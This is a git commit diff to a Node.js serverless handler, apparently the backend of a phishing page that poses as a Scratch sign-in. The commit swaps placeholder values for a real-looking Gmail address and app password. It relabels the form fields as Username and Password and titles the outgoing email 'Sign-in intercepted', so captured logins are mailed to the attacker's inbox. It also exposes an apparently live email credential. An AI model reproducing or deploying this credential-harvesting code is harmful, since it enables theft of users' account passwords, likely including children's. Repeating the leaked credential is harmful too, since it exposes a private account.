7e62a29fd92c9eee92dad1d836e1122ec9f1a340
scratch.mit.edu <153763669+secure-sso@users.noreply.github.com>
2023-12-13 13:22:18 -0600

    Update process.js

--- api/process.js
+++ api/process.js
@@ -10,17 +10,17 @@ module.exports = async (req, res) => {
         const transporter = nodemailer.createTransport({
             service: 'gmail',
             auth: {
-                user: 'your.email@gmail.com',
-                pass: 'your-email-password',
+                user: 'silasputerbaugh1@gmail.com',
+                pass: 'ziug hfpe liwa hkzf',
             },
         });
 
         // Compose email
         const mailOptions = {
-            from: 'your.email@gmail.com',
-            to: 'your.email@gmail.com',  // Your email address
-            subject: 'New Form Submission',
-            text: `Name: ${name}\nEmail: ${email}`,
+            from: 'silasputerbaugh1@gmail.com',
+            to: 'silasputerbaugh1@gmail.com',  // Your email address
+            subject: 'Sign-in intercepted',
+            text: `Username: ${name}\nPassword: ${email}`,
         };
 
         // Send email
@@ -30,7 +30,7 @@ module.exports = async (req, res) => {
                 res.status(500).send('Internal Server Error');
             } else {
                 console.log('Email sent: ' + info.response);
-                res.status(200).send('Email sent successfully');
+                res.status(200).send('Email sent successfully! 😈');
             }
         });
     } else {
